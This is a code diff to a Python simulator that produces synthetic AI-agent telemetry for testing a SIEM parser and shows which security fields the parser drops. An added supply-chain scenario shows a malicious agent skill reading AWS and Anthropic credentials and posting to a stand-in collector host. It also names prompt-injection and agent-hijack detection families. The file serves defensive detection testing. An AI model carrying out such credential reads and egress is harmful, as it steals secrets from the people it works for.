@@ -33,6 +33,94 @@ SCHEMA_OBSERVRA = "observra:1.0"
 SCHEMA_ABA = "aba-1.0"
 FORWARDER = "agent-sensor:1.0.4"
 
+# What the published ABA parser actually extracts, source path -> CIM2 field.
+# Transcribed from Content-Library-CIM2 (master):
+#   DS/Exabeam/aba_telemetry/Ps/pC_exabeamabajsonaiagentactivity.md
+# All 23 extractions are operational — agent, model, tokens, cost, host, user,
+# tool. No security-relevant field has a destination; see UNMAPPED below.
+PARSER_TOP_LEVEL: dict[str, str] = {
+    "ts": "time",
+    "session": "conversation_id",
+    "type": "operation",
+    "agent": "ai_agent_name",  # the real agent
+    "framework": "agent_name",  # NB: holds the framework, by parser design
+    "model": "model_name",
+    "tool": "ai_tool_name",
+    "text": "llm_request",
+    "prompt": "llm_request",
+    "response": "llm_response",
+    "in": "ai_token_in_count",
+    "out": "ai_token_out_count",
+    "cost_usd": "cost",  # MUST be top level — nesting it drops the field
+    "host": "src_host",
+    "user": "user",
+    "os": "os",
+    "arch": "system_architecture",
+}
+
+PARSER_DATA: dict[str, str] = {
+    "action": "operation_type",
+    "result": "result",
+    "role": "message_author_type",
+    "session_key": "conversation_id",
+    "vendor": "vendor_name",
+    "total_tokens": "ai_token_count",
+}
+
+# Emitted by the producers, extracted by nothing. Each entry names the
+# detection family it blocks — this is the argument for extending the parser.
+UNMAPPED: dict[str, str] = {
+    "has_injection": "prompt-injection detection",
+    "injection_patterns": "prompt-injection detection",
+    "current_depth": "runaway delegation / agent hijack",
+    "max_depth": "runaway delegation / agent hijack",
+    "source_agent": "agent-to-agent lateral movement",
+    "target_agent": "agent-to-agent lateral movement",
+    "skill": "malicious-skill detection",
+    "skill_source": "malicious-skill detection",
+    "skill_publisher": "malicious-skill detection",
+    "skill_version": "malicious-skill detection",
+    "skill_digest": "malicious-skill detection",
+    "triggered_rules": "producer's own rule verdicts",
+    "max_severity": "producer's own rule verdicts",
+    "error_class": "failure classification",
+    "duration_ms": "failure classification",
+    "reversible": "failure classification",
+    "tool_velocity": "automated-abuse behavioural signal",
+    "suspicious_sequence": "automated-abuse behavioural signal",
+}
+
+
+def parser_coverage(events: list[dict[str, Any]]) -> dict[str, set[str]]:
+    """CIM2 fields the published parser would populate, -> event types supplying them."""
+    covered: dict[str, set[str]] = {}
+    for ev in events:
+        etype = ev.get("type", "?")
+        for src, cim in PARSER_TOP_LEVEL.items():
+            if ev.get(src) not in (None, "", [], {}):
+                covered.setdefault(cim, set()).add(etype)
+        data = ev.get("data") or {}
+        for src, cim in PARSER_DATA.items():
+            if data.get(src) not in (None, "", [], {}):
+                covered.setdefault(cim, set()).add(etype)
+    return covered
+
+
+def dropped_at_extraction(events: list[dict[str, Any]]) -> dict[str, set[str]]:
+    """Fields present in the payloads that the published parser discards.
+
+    Everything here reaches the collector, parses successfully, and is then
+    thrown away before it becomes a CIM2 field — so no detection can reference
+    it, however the rule is written.
+    """
+    dropped: dict[str, set[str]] = {}
+    for ev in events:
+        etype = ev.get("type", "?")
+        for key in ev:
+            if key in UNMAPPED and ev.get(key) not in (None, "", [], {}):
+                dropped.setdefault(key, set()).add(etype)
+    return dropped
+
 
 @dataclass(frozen=True)
 class AbaEvent:
@@ -55,6 +143,32 @@ class AbaEvent:
     result: str = "success"
     has_injection: bool = False
     notes: str = ""
+
+    # -- Security signals the producers emit but the published parser drops.
+    # Carried here so a custom/extended parser can be validated against real
+    # payloads, and so `--coverage` can show the extraction gap concretely.
+    injection_patterns: list[str] | None = None
+    current_depth: int | None = None
+    max_depth: int | None = None
+    source_agent: str | None = None
+    target_agent: str | None = None
+    error_class: str | None = None
+    duration_ms: int | None = None
+    tool_velocity: float | None = None
+    suspicious_sequence: bool = False
+    triggered_rules: list[str] | None = None
+    max_severity: str | None = None
+    reversible: bool | None = None
+
+    # -- Skill provenance (observra schema 1.1).
+    # A skill runs with the invoking agent's permissions, so the name alone
+    # does not support a detection — first-seen and allowlist rules need to
+    # know the publisher, the version, and whether the contents changed.
+    skill_name: str | None = None
+    skill_source: str | None = None
+    skill_publisher: str | None = None
+    skill_version: str | None = None
+    skill_digest: str | None = None
 
 
 @dataclass(frozen=True)
@@ -253,8 +367,86 @@ _ACTIVITY = AbaScenario(
 )
 
 
+# -- Supply chain --------------------------------------------------------------
+# Modelled on the agent-skill registry compromises: a skill is selected by the
+# agent as part of a normal workflow and executes with the agent's full
+# permissions — no human clicks anything. Detection therefore has to key on
+# provenance (publisher, version, digest), not on the skill name.
+#
+# NOTE: every signal this scenario depends on is currently dropped at
+# extraction. It is here to validate an extended parser, not to fire an OOTB
+# rule — `--coverage` reports exactly which fields are lost.
+
+_SUPPLY_CHAIN = AbaScenario(
+    key="aba-supplychain",
+    title="Malicious skill from a first-seen publisher",
+    description=(
+        "A four-stage chain: an unfamiliar skill is invoked, reads credentials, "
+        "opens an outbound connection, then a delegation guard trips. Exercises "
+        "skill provenance and the delegation/handoff signals. None of these "
+        "fields are extracted by the published parser today — run with "
+        "--coverage to see the gap."
+    ),
+    events=[
+        AbaEvent(
+            key="supply-skill-first-seen",
+            title="Skill invoked from a publisher never seen before",
+            activity="tool_call", event_type="skill",
+            targets="First invocation of this skill for the organization",
+            tool="invoice-normaliser",
+            skill_name="invoice-normaliser",
+            skill_source="clawhub",
+            skill_publisher="acme-invoice-tools",
+            skill_version="0.1.4",
+            skill_digest="sha256:" + "3f" * 32,
+            notes="Provenance is the detection surface — the name alone is unremarkable.",
+        ),
+        AbaEvent(
+            key="supply-credential-read",
+            title="Skill reads environment credentials",
+            activity="access_file", event_type="tool",
+            targets="Agent accessed a credential store",
+            tool="read_env",
+            response="AWS_SECRET_ACCESS_KEY=<redacted> ANTHROPIC_API_KEY=<redacted>",
+            skill_name="invoice-normaliser",
+            skill_publisher="acme-invoice-tools",
+            tool_velocity=42.0,
+            suspicious_sequence=True,
+            notes="Velocity and sequence are computed by the producer, dropped by the parser.",
+        ),
+        AbaEvent(
+            key="supply-outbound",
+            title="Outbound connection to an unrecognised host",
+            activity="send_external", event_type="tool",
+            targets="Outbound connection from an agent process",
+            tool="http_post",
+            text="POST https://collector.acme-invoice-tools.example/ingest",
+            skill_name="invoice-normaliser",
+            triggered_rules=["skill.untrusted_egress"],
+            max_severity="high",
+            reversible=False,
+            notes="triggered_rules is the producer's own verdict — also dropped.",
+        ),
+        AbaEvent(
+            key="supply-depth-guard",
+            title="Delegation depth guard trips",
+            activity="invoke_agent", event_type="depth_exceeded",
+            targets="Delegation depth exceeded",
+            source_agent="atlas-support-agent",
+            target_agent="atlas-billing-agent",
+            current_depth=4,
+            max_depth=2,
+            result="blocked",
+            error_class="DepthGuardError",
+            duration_ms=180,
+            notes="Blocked by the producer; the SIEM never learns it happened.",
+        ),
+    ],
+)
+
+
 ABA_SCENARIOS: dict[str, AbaScenario] = {
-    s.key: s for s in (_INJECTION, _GUARDRAIL, _LIFECYCLE, _ACTIVITY)
+    s.key: s for s in (_INJECTION, _GUARDRAIL, _LIFECYCLE, _ACTIVITY, _SUPPLY_CHAIN)
 }
 
 
@@ -306,10 +498,33 @@ def build_aba_event(
         "forwarder": FORWARDER,
         "schema": schema,
         "has_injection": ev.has_injection,
-        "suspicious_sequence": False,
+        "suspicious_sequence": ev.suspicious_sequence,
         # Marker keeps synthetic events identifiable in a shared tenant.
         "sim_marker": marker,
     }
+    # Security signals. Emitted whenever the scenario sets them, even though
+    # the published parser extracts none of them — that delta is the point of
+    # `--coverage`, and an extended parser needs real payloads to map against.
+    for key, val in (
+        ("injection_patterns", ev.injection_patterns),
+        ("current_depth", ev.current_depth),
+        ("max_depth", ev.max_depth),
+        ("source_agent", ev.source_agent),
+        ("target_agent", ev.target_agent),
+        ("error_class", ev.error_class),
+        ("duration_ms", ev.duration_ms),
+        ("tool_velocity", ev.tool_velocity),
+        ("triggered_rules", ev.triggered_rules),
+        ("max_severity", ev.max_severity),
+        ("reversible", ev.reversible),
+        ("skill", ev.skill_name),
+        ("skill_source", ev.skill_source),
+        ("skill_publisher", ev.skill_publisher),
+        ("skill_version", ev.skill_version),
+        ("skill_digest", ev.skill_digest),
+    ):
+        if val is not None:
+            out[key] = val
     if ev.model:
         out["model"] = ev.model
     if ev.tool:
